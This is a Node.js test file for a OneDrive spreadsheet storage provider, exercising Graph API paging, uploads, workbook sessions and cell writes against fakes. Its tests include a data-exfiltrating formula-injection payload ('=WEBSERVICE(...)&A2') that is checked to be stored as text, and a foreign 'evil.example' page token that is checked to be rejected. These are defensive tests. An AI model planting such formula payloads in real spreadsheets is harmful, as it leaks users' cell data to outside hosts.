/**
 * OneDrive as a mirror storage, against a recording fake of graphRequest and
 * of the global fetch: the own drive id fetched once and every item addressed
 * under /drives/{driveId}/items/{id}; sharedWithMe mapped through remoteItem;
 * the marker compares cTag while If-Match carries eTag; the download goes to
 * the pre-authenticated URL with NO Authorization header; simple PUT ≤ 4 MB
 * else an upload session with ranged PUTs; 412 → conflict, 423 → locked; the
 * workbook API detected per file (ApiNotSupported → no cells), every workbook
 * call under a workbook-session-id, closeSession even after a failure, the
 * range addresses Excel expects, a formula-shaped text typed Text BEFORE its
 * value lands, and a refusal naming a foreign item by its drive|item id.
 *
 * Run: cd server && node --test core/dataEngine/sources/spreadsheetFile/providers/oneDrive.test.js
 */
const test = require('node:test');
const assert = require('node:assert');
const { installResolveStub } = require('../../../../../testUtils/stubRequire');

const GRAPH_BASE = 'https://graph.microsoft.com/v1.0';
const calls = { graph: [], fetch: [] };
const world = { routes: [], notConnected: false, cTag: 'c1', eTag: 'e1', sessionId: 'sess-1' };

const json = (body, status = 200) => new Response(JSON.stringify(body), { status, headers: { 'content-type': 'application/json' } });
const empty = (status = 204) => new Response(null, { status });
const graphErr = (status, code, message = code) => json({ error: { code, message } }, status);

function item(id, extra = {}) {
    return { id, name: `${id}.xlsx`, size: 2048, eTag: world.eTag, cTag: world.cTag, lastModifiedDateTime: '2026-09-01T10:00:00Z', file: { mimeType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' }, webUrl: `https://1drv/${id}`, parentReference: { driveId: 'me-drive', id: 'root-id', path: '/drive/root:/Documents' }, '@microsoft.graph.downloadUrl': `https://content.example/${id}`, ...extra };
}

/** Route table: [method, path-prefix or regex, handler(path, options) → Response]. First match wins. */
function route(method, match, handler) { world.routes.push({ method, match, handler }); }
async function dispatch(method, path, options) {
    for (const r of world.routes) {
        if (r.method !== method) continue;
        if (typeof r.match === 'string' ? path.startsWith(r.match) : r.match.test(path)) return r.handler(path, options);
    }
    return graphErr(404, 'itemNotFound', `no route for ${method} ${path}`);
}

const restore = installResolveStub({
    '../../../../../integrations/msGraphClient': {
        GRAPH_BASE,
        graphRequest: async (path, session, options = {}) => {
            calls.graph.push({ path, method: options.method || 'GET', headers: options.headers || {}, body: options.body, session });
            if (world.notConnected) throw new Error('NOT_CONNECTED');
            return dispatch(options.method || 'GET', path, options);
        },
    },
});
const oneDrive = require('./oneDrive');
test.after(() => restore());

const realFetch = globalThis.fetch;
test.beforeEach(() => {
    calls.graph.length = 0; calls.fetch.length = 0;
    Object.assign(world, { routes: [], notConnected: false, cTag: 'c1', eTag: 'e1', sessionId: 'sess-1' });
    route('GET', '/me/drive?$select=id', () => json({ id: 'me-drive' }));
    route('GET', /^\/drives\/me-drive\/items\/f1\?\$select=/, () => json(item('f1')));
    route('GET', /^\/drives\/other-drive\/items\/r1\?\$select=/, () => json(item('r1', { parentReference: { driveId: 'other-drive', id: 'x', path: '/drive/root:/Shared' } })));
    globalThis.fetch = async (url, options = {}) => {
        calls.fetch.push({ url: String(url), method: options.method || 'GET', headers: options.headers || {}, body: options.body });
        if (String(url).startsWith('https://content.example/')) return new Response(Buffer.from('a;b\n1;2\n'), { status: 200 });
        if (String(url).startsWith('https://upload.example/')) {
            const range = /bytes (\d+)-(\d+)\/(\d+)/.exec(options.headers['Content-Range']);
            const last = Number(range[2]) + 1 === Number(range[3]);
            return last ? json(item('f1', { cTag: 'c-after-session' }), 201) : json({ nextExpectedRanges: [`${Number(range[2]) + 1}-`] }, 202);
        }
        return new Response('nope', { status: 500 });
    };
});
test.afterEach(() => { globalThis.fetch = realFetch; });

const cred = { oauthProvider: 'microsoft', accessToken: 'at' };
const api = () => oneDrive.forLinker(cred, { userId: 'u1' });
const graphCalls = (re) => calls.graph.filter((c) => re.test(c.path));

test('module shape; the own drive id is fetched once and reused', async () => {
    assert.equal(oneDrive.provider, 'onedrive');
    assert.equal(oneDrive.oauthProvider, 'microsoft');
    assert.deepEqual(oneDrive.integrationAppIds, ['onedrive']);
    const a = api();
    await a.probe({ fileId: 'f1' });
    await a.probe({ fileId: 'f1' });
    assert.equal(graphCalls(/^\/me\/drive\?/).length, 1);
    assert.equal(graphCalls(/^\/drives\/me-drive\/items\/f1\?/).length, 2);
    assert.strictEqual(calls.graph[0].session, cred, 'the credential shim is the Graph session');
});

test('list: root children, a folder\'s children, search, recent; $select carries eTag,cTag; spreadsheets and folders only', async () => {
    route('GET', /\/me\/drive\/root\/children/, () => json({
        value: [
            { id: 'd1', name: 'Documents', folder: { childCount: 2 }, parentReference: { driveId: 'me-drive', id: 'root-id', path: '/drive/root:' } },
            item('f1'),
            { id: 'w1', name: 'notes.docx', size: 5, file: { mimeType: 'application/msword' }, parentReference: { driveId: 'me-drive' } },
            { id: 'c1', name: 'klanten.csv', size: 5, file: { mimeType: 'text/plain' }, eTag: 'ce', cTag: 'cc', parentReference: { driveId: 'me-drive', id: 'root-id', path: '/drive/root:' } },
        ],
        '@odata.nextLink': `${GRAPH_BASE}/me/drive/root/children?$skiptoken=abc`,
    }));
    route('GET', '/drives/me-drive/items/d1/children', () => json({ value: [] }));
    route('GET', '/me/drive/search(q=', () => json({ value: [item('f1')] }));
    route('GET', '/me/drive/recent', () => json({ value: [] }));
    const a = api();
    const r = await a.list({ view: 'mine' });
    assert.match(calls.graph.at(-1).path, /^\/me\/drive\/root\/children\?\$top=50&\$select=id,name,size,eTag,cTag,lastModifiedDateTime,file,folder,webUrl,parentReference,remoteItem&\$orderby=name$/);
    assert.deepEqual(r.items.map((i) => [i.fileId, i.isFolder, i.format, i.owned, i.path]), [
        ['d1', true, null, true, '/Documents'], ['f1', false, 'xlsx', true, '/Documents/f1.xlsx'], ['c1', false, 'csv', true, '/klanten.csv'],
    ]);
    assert.equal(r.items[1].etag, 'e1');
    assert.equal(r.items[1].driveId, 'me-drive');
    assert.equal(r.nextPageToken, `${GRAPH_BASE}/me/drive/root/children?$skiptoken=abc`);
    await a.list({ view: 'mine', parentId: 'd1' });
    assert.match(calls.graph.at(-1).path, /^\/drives\/me-drive\/items\/d1\/children\?/);
    await a.list({ view: 'search', q: "O'Brien Q3" });
    assert.match(calls.graph.at(-1).path, /^\/me\/drive\/search\(q='O''Brien%20Q3'\)\?/);
    await a.list({ view: 'recent' });
    assert.match(calls.graph.at(-1).path, /^\/me\/drive\/recent\?/);
    await a.list({ pageToken: r.nextPageToken });
    assert.equal(calls.graph.at(-1).path, r.nextPageToken, 'a nextLink is followed as-is');
    await assert.rejects(() => a.list({ pageToken: 'https://evil.example/x' }), (e) => e.code === 'spreadsheet_rejected');
});

test('list shared: remoteItem is the file, its parentReference.driveId is the drive, owned is false', async () => {
    route('GET', '/me/drive/sharedWithMe', () => json({
        value: [
            { id: 'stub1', name: 'ignored.xlsx', remoteItem: { id: 'r1', name: 'shared.xlsx', size: 99, eTag: 're', cTag: 'rc', lastModifiedDateTime: '2026-09-03T00:00:00Z', file: { mimeType: 'x' }, webUrl: 'https://1drv/r1', parentReference: { driveId: 'other-drive', id: 'p9' } } },
            { id: 'stub2', name: 'Team folder', remoteItem: { id: 'r2', name: 'Team folder', folder: {}, parentReference: { driveId: 'other-drive' } } },
            { id: 'stub3', name: 'deck.pptx', remoteItem: { id: 'r3', name: 'deck.pptx', file: {}, parentReference: { driveId: 'other-drive' } } },
        ],
    }));
    const { items } = await api().list({ view: 'shared' });
    assert.match(calls.graph.at(-1).path, /^\/me\/drive\/sharedWithMe\?\$select=id,name,remoteItem$/);
    assert.deepEqual(items.map((i) => [i.fileId, i.driveId, i.name, i.isFolder, i.owned]), [
        ['r1', 'other-drive', 'shared.xlsx', false, false], ['r2', 'other-drive', 'Team folder', true, false],
    ]);
    assert.equal(items[0].etag, 're');
    assert.equal(items[0].parentId, 'p9');
});

test('probe: marker {eTag, cTag, lastModifiedDateTime, size}; cTag decides equality; owned = driveId is mine; deleted → 404', async () => {
    const p = await api().probe({ fileId: 'f1' });
    assert.deepEqual(p.marker, { eTag: 'e1', cTag: 'c1', lastModifiedDateTime: '2026-09-01T10:00:00Z', size: 2048 });
    assert.match(calls.graph.at(-1).path, /\$select=id,name,size,eTag,cTag,lastModifiedDateTime,file,folder,webUrl,parentReference,deleted,@microsoft\.graph\.downloadUrl$/);
    assert.equal(p.owned, true);
    assert.equal(p.format, 'xlsx');
    assert.equal(p.path, '/Documents/f1.xlsx');
    assert.equal(p.webUrl, 'https://1drv/f1');
    assert.equal(oneDrive.markerEquals(p.marker, { cTag: 'c1', eTag: 'renamed' }), true, 'a rename moves eTag only');
    assert.equal(oneDrive.markerEquals(p.marker, { cTag: 'c2', eTag: 'e1' }), false);
    const shared = await api().probe({ fileId: 'r1', driveId: 'other-drive' });
    assert.equal(shared.owned, false);
    assert.match(calls.graph.at(-1).path, /^\/drives\/other-drive\/items\/r1\?/);
    route('GET', /^\/drives\/me-drive\/items\/gone\?/, () => json(item('gone', { deleted: { state: 'deleted' } })));
    await assert.rejects(() => api().probe({ fileId: 'gone' }), (e) => e.code === 'spreadsheet_not_found' && e.status === 404);
    await assert.rejects(() => api().probe({ fileId: 'missing' }), (e) => e.code === 'spreadsheet_not_found');
});

test('download: the pre-authenticated downloadUrl is fetched with NO Authorization header; size cap first', async () => {
    const { buffer, marker } = await api().download({ fileId: 'f1' }, { maxBytes: 20e6 });
    assert.equal(buffer.toString(), 'a;b\n1;2\n');
    assert.equal(marker.cTag, 'c1');
    assert.equal(calls.fetch.length, 1);
    assert.equal(calls.fetch[0].url, 'https://content.example/f1');
    assert.equal(calls.fetch[0].headers.Authorization, undefined);
    assert.equal(calls.fetch[0].headers.authorization, undefined);
    calls.fetch.length = 0;
    await assert.rejects(() => api().download({ fileId: 'f1' }, { maxBytes: 100 }), (e) => e.code === 'spreadsheet_too_large' && e.status === 413);
    assert.equal(calls.fetch.length, 0);
});

test('upload ≤ 4 MB: PUT …/content with application/octet-stream + If-Match: <eTag>; 412 → conflict, 423 → locked, 403 → forbidden', async () => {
    route('PUT', '/drives/me-drive/items/f1/content', (path, options) => {
        if (options.headers['If-Match'] !== 'e1') return graphErr(412, 'resourceModified');
        return json(item('f1', { eTag: 'e2', cTag: 'c2' }));
    });
    const r = await api().upload({ fileId: 'f1' }, Buffer.from('new'), { ifMatch: { eTag: 'e1', cTag: 'c1' }, contentType: 'text/csv' });
    const put = calls.graph.find((c) => c.method === 'PUT');
    assert.equal(put.path, '/drives/me-drive/items/f1/content');
    assert.equal(put.headers['Content-Type'], 'application/octet-stream');
    assert.equal(put.headers['If-Match'], 'e1');
    assert.ok(Buffer.isBuffer(put.body));
    assert.deepEqual(r.marker, { eTag: 'e2', cTag: 'c2', lastModifiedDateTime: '2026-09-01T10:00:00Z', size: 2048 });
    await assert.rejects(() => api().upload({ fileId: 'f1' }, Buffer.from('new'), { ifMatch: { eTag: 'stale', cTag: 'c1' } }), (e) => e.code === 'spreadsheet_conflict' && e.status === 409);
    world.routes.unshift({ method: 'PUT', match: '/drives/me-drive/items/f1/content', handler: () => graphErr(423, 'resourceLocked', 'The resource is locked') });
    await assert.rejects(() => api().upload({ fileId: 'f1' }, Buffer.from('new'), { ifMatch: { eTag: 'e1' } }), (e) => e.code === 'spreadsheet_locked' && e.status === 409);
    world.routes.unshift({ method: 'PUT', match: '/drives/me-drive/items/f1/content', handler: () => graphErr(403, 'accessDenied') });
    await assert.rejects(() => api().upload({ fileId: 'f1' }, Buffer.from('new'), {}), (e) => e.code === 'spreadsheet_forbidden' && e.status === 403);
});

test('upload > 4 MB: createUploadSession (If-Match honoured) then ranged PUTs to the session URL, no bearer, chunks a multiple of 320 KiB', async () => {
    route('POST', '/drives/me-drive/items/f1/createUploadSession', (path, options) => {
        assert.equal(options.headers['If-Match'], 'e1');
        assert.deepEqual(JSON.parse(options.body), { item: { '@microsoft.graph.conflictBehavior': 'replace' } });
        return json({ uploadUrl: 'https://upload.example/session' });
    });
    const big = Buffer.alloc(oneDrive.SIMPLE_UPLOAD_MAX + 1, 1);
    const r = await api().upload({ fileId: 'f1' }, big, { ifMatch: { eTag: 'e1', cTag: 'c1' } });
    assert.equal(calls.graph.filter((c) => c.method === 'PUT').length, 0, 'no simple PUT');
    const puts = calls.fetch.filter((c) => c.method === 'PUT');
    assert.equal(puts.length, 2);
    assert.equal(puts[0].headers['Content-Range'], `bytes 0-${oneDrive.UPLOAD_CHUNK - 1}/${big.length}`);
    assert.equal(puts[1].headers['Content-Range'], `bytes ${oneDrive.UPLOAD_CHUNK}-${big.length - 1}/${big.length}`);
    assert.equal(oneDrive.UPLOAD_CHUNK % (320 * 1024), 0);
    assert.equal(puts[0].headers.Authorization, undefined);
    assert.equal(r.marker.cTag, 'c-after-session');
});

test('cells.detectWorkbook: true when the worksheets endpoint answers, false on ApiNotSupported / AccessDenied, never for csv', async () => {
    let answer = () => json({ value: [{ id: '{1}', name: 'Blad1', position: 0, visibility: 'Visible' }] });
    route('GET', '/drives/me-drive/items/f1/workbook/worksheets?$select=id,name,position,visibility', () => answer());
    assert.equal(await api().cells.detectWorkbook({ fileId: 'f1', format: 'xlsx' }), true);
    answer = () => graphErr(400, 'ApiNotSupported', 'Workbook API not supported for consumer accounts');
    assert.equal(await api().cells.available({ fileId: 'f1', format: 'xlsx' }), false);
    answer = () => graphErr(403, 'AccessDenied');
    assert.equal(await api().cells.available({ fileId: 'f1', format: 'xlsm' }), false);
    assert.equal(await api().cells.available({ fileId: 'c1', format: 'csv' }), false);
    const a = api();
    answer = () => json({ value: [] });
    assert.equal(await a.cells.available({ fileId: 'f1', format: 'xlsx' }), true);
    const before = graphCalls(/workbook\/worksheets/).length;
    await a.cells.available({ fileId: 'f1', format: 'xlsx' });
    assert.equal(graphCalls(/workbook\/worksheets/).length, before, 'remembered per file');
    answer = () => graphErr(503, 'serviceNotAvailable');
    await assert.rejects(() => api().cells.available({ fileId: 'f1', format: 'xlsx' }), (e) => e.code === 'spreadsheet_unavailable');
    world.notConnected = true;
    await assert.rejects(() => api().cells.available({ fileId: 'f1', format: 'xlsx' }), (e) => e.code === 'linker_unavailable' && e.status === 503);
});

test('cells.listSheets / sample / readSheet / readRow: worksheets with usedRange sizes, the sample range, the row-capped read from the used range', async () => {
    const WB = '/drives/me-drive/items/f1/workbook';
    route('GET', `${WB}/worksheets?$select=id,name,position,visibility`, () => json({ value: [{ id: '{1}', name: 'Blad1', position: 0, visibility: 'Visible' }, { id: '{2}', name: 'Hidden', position: 1, visibility: 'Hidden' }] }));
    route('GET', `${WB}/worksheets/%7B1%7D/usedRange(valuesOnly=true)?$select=address,rowCount,columnCount`, () => json({ address: 'Blad1!A1:C20', rowCount: 20, columnCount: 3 }));
    route('GET', `${WB}/worksheets/%7B2%7D/usedRange(valuesOnly=true)`, () => graphErr(404, 'ItemNotFound'));
    route('GET', `${WB}/worksheets/%7B1%7D/range(address='A1:CV501')?$select=values,numberFormat,formulas`, () => json({
        values: [['Datum', 'Bedrag', 'Totaal'], [46000, 12.5, 12.5], [46001, 3, 3], ['', '', '']],
        numberFormat: [['General', 'General', 'General'], ['dd-mm-yyyy', '0.00', 'General'], ['dd-mm-yyyy hh:mm', '0.00', 'General'], ['General', 'General', 'General']],
        formulas: [['Datum', 'Bedrag', 'Totaal'], [46000, 12.5, '=B2'], [46001, 3, '=B3'], ['', '', '']],
    }));
    route('GET', `${WB}/worksheets/%7B1%7D/range(address='A1:C11')?$select=values`, () => json({ values: [['Datum', 'Bedrag', 'Totaal'], [46000, '#N/A', ''], [46001, 3, 3]] }));
    route('GET', `${WB}/worksheets/%7B1%7D/range(address='A7:CV7')?$select=values`, () => json({ values: [[46007, '', 'x']] }));
    const a = api();
    const tabs = await a.cells.listSheets({ fileId: 'f1', format: 'xlsx' });
    assert.deepEqual(tabs, [
        { id: '{1}', name: 'Blad1', index: 0, rowCount: 20, colCount: 3, hidden: false },
        { id: '{2}', name: 'Hidden', index: 1, rowCount: null, colCount: null, hidden: true },
    ]);
    const s = await a.cells.sample({ fileId: 'f1' }, tabs[0], { headerRow: 1, rows: 500 });
    assert.deepEqual(s.rows, [['Datum', 'Bedrag', 'Totaal'], [46000, 12.5, 12.5], [46001, 3, 3]]);
    assert.equal(s.numberFormat.get(0), 'DATE');
    assert.equal(s.numberFormat.has(1), false);
    assert.deepEqual([...s.formulaCols], [2]);
    const r = await a.cells.readSheet({ fileId: 'f1' }, tabs[0], { headerRow: 1, maxRows: 10, maxCols: 100 });
    assert.deepEqual(r.rows, [['Datum', 'Bedrag', 'Totaal'], [46000, null, null], [46001, 3, 3]]);
    assert.equal(r.errorCells, 1);
    assert.deepEqual(await a.cells.readRow({ fileId: 'f1' }, tabs[0], 7), [46007, null, 'x']);
});

test('cells.updateCells: createSession → PATCH range(address=\'C7\') per cell under workbook-session-id → closeSession; emulated cTag guard', async () => {
    const WB = '/drives/me-drive/items/f1/workbook';
    route('POST', `${WB}/createSession`, () => json({ id: world.sessionId }));
    route('POST', `${WB}/closeSession`, () => empty(204));
    route('PATCH', `${WB}/worksheets/%7B1%7D/range(address=`, () => json({}));
    const r = await api().cells.updateCells({ fileId: 'f1' }, { id: '{1}', name: 'Blad1' }, 7, [
        { col: 2, value: 'Acme', type: 'text' }, { col: 0, value: 46000, type: 'date' }, { col: 5, value: null, type: 'number' },
    ], { ifMatch: { cTag: 'c1', eTag: 'e1' } });
    const seq = calls.graph.filter((c) => /workbook/.test(c.path)).map((c) => [c.method, c.path.replace(WB, ''), c.headers['workbook-session-id'], c.body ? JSON.parse(c.body) : null]);
    assert.deepEqual(seq, [
        ['POST', '/createSession', undefined, { persistChanges: true }],
        ['PATCH', "/worksheets/%7B1%7D/range(address='C7')", 'sess-1', { values: [['Acme']] }],
        ['PATCH', "/worksheets/%7B1%7D/range(address='A7')", 'sess-1', { values: [[46000]] }],
        ['PATCH', "/worksheets/%7B1%7D/range(address='F7')", 'sess-1', { values: [['']] }],
        ['POST', '/closeSession', 'sess-1', null],
    ]);
    assert.equal(r.marker.cTag, 'c1');
    // A text that Excel's Range.values would parse as a formula (=, +, -, @,
    // tab, CR) is typed Text FIRST, in a PATCH of its own — a `=WEBSERVICE(…)`
    // typed by an editor must land as a string in the linker's file, and a
    // phone number "+31 6 …" must not be refused as a broken formula. A
    // number column's -5 is a number and gets no such PATCH.
    calls.graph.length = 0;
    await api().cells.updateCells({ fileId: 'f1' }, { id: '{1}', name: 'Blad1' }, 8, [
        { col: 0, value: '=WEBSERVICE("https://x/?"&A2)', type: 'text' },
        { col: 1, value: '+31 6 1234 5678', type: 'text' },
        { col: 2, value: -5, type: 'number' },
        { col: 3, value: '-', type: 'select' },
        { col: 4, value: 'plain', type: 'text' },
    ], { ifMatch: { cTag: 'c1', eTag: 'e1' } });
    const guarded = calls.graph.filter((c) => c.method === 'PATCH').map((c) => [c.path.replace(WB, ''), JSON.parse(c.body)]);
    assert.deepEqual(guarded, [
        ["/worksheets/%7B1%7D/range(address='A8')", { numberFormat: [['@']] }],
        ["/worksheets/%7B1%7D/range(address='A8')", { values: [['=WEBSERVICE("https://x/?"&A2)']] }],
        ["/worksheets/%7B1%7D/range(address='B8')", { numberFormat: [['@']] }],
        ["/worksheets/%7B1%7D/range(address='B8')", { values: [['+31 6 1234 5678']] }],
        ["/worksheets/%7B1%7D/range(address='C8')", { values: [[-5]] }],
        ["/worksheets/%7B1%7D/range(address='D8')", { numberFormat: [['@']] }],
        ["/worksheets/%7B1%7D/range(address='D8')", { values: [['-']] }],
        ["/worksheets/%7B1%7D/range(address='E8')", { values: [['plain']] }],
    ]);
    calls.graph.length = 0;
    await assert.rejects(() => api().cells.updateCells({ fileId: 'f1' }, { id: '{1}' }, 7, [{ col: 0, value: 1, type: 'number' }], { ifMatch: { cTag: 'moved' } }),
        (e) => e.code === 'spreadsheet_conflict');
    assert.equal(calls.graph.filter((c) => /workbook/.test(c.path)).length, 0, 'no workbook call after a moved cTag');
});

test('cells.appendRow: usedRange → row n → a numberFormat PATCH (dates, formula-shaped texts) BEFORE the values PATCH on A<n>:<last><n>; deleteRow: range(\'7:7\')/delete shift Up', async () => {
    const WB = '/drives/me-drive/items/f1/workbook';
    route('POST', `${WB}/createSession`, () => json({ id: world.sessionId }));
    route('POST', `${WB}/closeSession`, () => empty(204));
    route('GET', `${WB}/worksheets/%7B1%7D/usedRange(valuesOnly=true)?$select=address,rowCount`, () => json({ address: 'Blad1!A1:F11', rowCount: 11 }));
    route('PATCH', `${WB}/worksheets/%7B1%7D/range(address=`, () => json({}));
    route('POST', `${WB}/worksheets/%7B1%7D/range(address='7:7')/delete`, () => empty(204));
    const a = api();
    const r = await a.cells.appendRow({ fileId: 'f1' }, { id: '{1}' }, [
        { col: 0, value: 46000, type: 'date' }, { col: 1, value: 'Acme', type: 'text' }, { col: 3, value: 46000.5, type: 'datetime' }, { col: 4, value: '=1+1', type: 'text' },
    ]);
    assert.equal(r.rowNumber, 12);
    const patches = calls.graph.filter((c) => c.method === 'PATCH');
    assert.equal(patches.length, 2, 'the format first, then the values — Graph promises no order for keys in one body');
    assert.equal(patches[0].path, `${WB}/worksheets/%7B1%7D/range(address='A12:E12')`);
    assert.equal(patches[0].headers['workbook-session-id'], 'sess-1');
    assert.deepEqual(JSON.parse(patches[0].body), { numberFormat: [['yyyy-mm-dd', null, null, 'yyyy-mm-dd hh:mm', '@']] });
    assert.equal(patches[1].path, patches[0].path);
    assert.deepEqual(JSON.parse(patches[1].body), { values: [[46000, 'Acme', '', 46000.5, '=1+1']] });
    calls.graph.length = 0;
    const r2 = await a.cells.appendRow({ fileId: 'f1' }, { id: '{1}' }, [{ col: 0, value: 'x', type: 'text' }], { afterRow: 20 });
    assert.equal(r2.rowNumber, 21, 'the engine\'s last data row wins over usedRange');
    assert.equal(calls.graph.filter((c) => /usedRange/.test(c.path)).length, 0);
    assert.equal(calls.graph.filter((c) => c.method === 'PATCH').length, 1, 'plain text: no format PATCH at all');
    calls.graph.length = 0;
    await a.cells.deleteRow({ fileId: 'f1' }, { id: '{1}' }, 7);
    const del = calls.graph.find((c) => /\/delete$/.test(c.path));
    assert.equal(del.path, `${WB}/worksheets/%7B1%7D/range(address='7:7')/delete`);
    assert.deepEqual(JSON.parse(del.body), { shift: 'Up' });
    assert.equal(del.headers['workbook-session-id'], 'sess-1');
    assert.equal(calls.graph.at(-2).path, `${WB}/closeSession`, 'closed before the re-probe');
});

test('closeSession runs even when a workbook write fails, and the failure keeps its status', async () => {
    const WB = '/drives/me-drive/items/f1/workbook';
    route('POST', `${WB}/createSession`, () => json({ id: 'sess-9' }));
    route('POST', `${WB}/closeSession`, () => empty(204));
    route('PATCH', `${WB}/worksheets/%7B1%7D/range(address=`, () => graphErr(423, 'resourceLocked', 'open in Excel'));
    await assert.rejects(() => api().cells.updateCells({ fileId: 'f1' }, { id: '{1}' }, 3, [{ col: 0, value: 'x', type: 'text' }]), (e) => e.code === 'spreadsheet_locked');
    const close = calls.graph.find((c) => /closeSession$/.test(c.path));
    assert.ok(close, 'closeSession was called');
    assert.equal(close.headers['workbook-session-id'], 'sess-9');
});

test('helpers: address parsing, column letters, paths, workbook values', () => {
    assert.deepEqual(oneDrive.parseAddress("'My Sheet'!C3:F20"), { sheet: 'My Sheet', first: { col: 2, row: 3 }, last: { col: 5, row: 20 } });
    assert.deepEqual(oneDrive.parseAddress('A1'), { sheet: null, first: { col: 0, row: 1 }, last: { col: 0, row: 1 } });
    assert.equal(oneDrive.parseAddress('garbage'), null);
    assert.equal(oneDrive.colLetter(27), 'AB');
    assert.equal(oneDrive.pathOf({ name: 'f.xlsx', parentReference: { path: '/drive/root:/Documents/Q%203' } }), '/Documents/Q 3/f.xlsx');
    assert.equal(oneDrive.pathOf({ name: 'f.xlsx', parentReference: {} }), null);
    assert.equal(oneDrive.workbookValue(null, 'text'), '');
    assert.equal(oneDrive.workbookValue('12.5', 'number'), 12.5);
    assert.equal(oneDrive.workbookValue('true', 'bool'), true);
    assert.equal(oneDrive.workbookValue('=1+1', 'text'), '=1+1', 'the value is not rewritten — the cell is typed Text instead');
    for (const v of ['=1+1', '+31 6', '-', '@x', '\tx', '\rx']) assert.equal(oneDrive.needsTextFormat(v, 'text'), true, JSON.stringify(v));
    assert.equal(oneDrive.needsTextFormat('=1+1', 'select'), true);
    assert.equal(oneDrive.needsTextFormat('plain', 'text'), false);
    assert.equal(oneDrive.needsTextFormat('x=1', 'text'), false);
    assert.equal(oneDrive.needsTextFormat('-5', 'number'), false, 'a number column is a number');
    assert.equal(oneDrive.needsTextFormat(-5, 'text'), false, 'only a string can be parsed as a formula');
    assert.equal(oneDrive.workbookFormat('text', '=1'), '@');
    assert.equal(oneDrive.workbookFormat('text', 'a'), null);
    assert.equal(oneDrive.workbookFormat('date', 46000), 'yyyy-mm-dd');
});

test('refOf: a refusal names a foreign item by its drive|item id (the browser\'s own), an own item bare', async () => {
    // module-level, before the own drive is known: a driveId on the ref is the client's composite echoed back
    assert.deepEqual(oneDrive.refOf({ fileId: '01ITEM', driveId: 'b!drv' }), { provider: 'onedrive', fileId: 'b!drv|01ITEM' });
    assert.deepEqual(oneDrive.refOf({ fileId: '01ITEM', driveId: 'b!drv', owned: true }), { provider: 'onedrive', fileId: '01ITEM' });
    assert.deepEqual(oneDrive.refOf({ fileId: '01ITEM' }), { provider: 'onedrive', fileId: '01ITEM' });
    // once known, the own drive decides: the engine's stored ref of an OWN file carries the own driveId and stays bare
    assert.deepEqual(oneDrive.refOf({ fileId: 'f1', driveId: 'me-drive' }, 'me-drive'), { provider: 'onedrive', fileId: 'f1' });
    assert.deepEqual(oneDrive.refOf({ fileId: 'r1', driveId: 'other-drive' }, 'me-drive'), { provider: 'onedrive', fileId: 'other-drive|r1' });
    // through the api: a shared item that is no spreadsheet, refused with the composite id the wizard keyed on
    route('GET', /^\/drives\/other-drive\/items\/deck\?\$select=/, () => json({ id: 'deck', name: 'deck.pptx', file: { mimeType: 'x' }, parentReference: { driveId: 'other-drive' } }));
    await assert.rejects(() => api().probe({ fileId: 'deck', driveId: 'other-drive' }), (e) => e.code === 'format_unsupported' && e.ref.fileId === 'other-drive|deck');
    route('GET', /^\/drives\/me-drive\/items\/deck\?\$select=/, () => json({ id: 'deck', name: 'deck.pptx', file: { mimeType: 'x' }, parentReference: { driveId: 'me-drive' } }));
    await assert.rejects(() => api().probe({ fileId: 'deck', driveId: 'me-drive' }), (e) => e.code === 'format_unsupported' && e.ref.fileId === 'deck');
    await assert.rejects(() => api().probe({ fileId: 'missing', driveId: 'other-drive' }), (e) => e.code === 'spreadsheet_not_found' && e.ref.fileId === 'other-drive|missing');
});
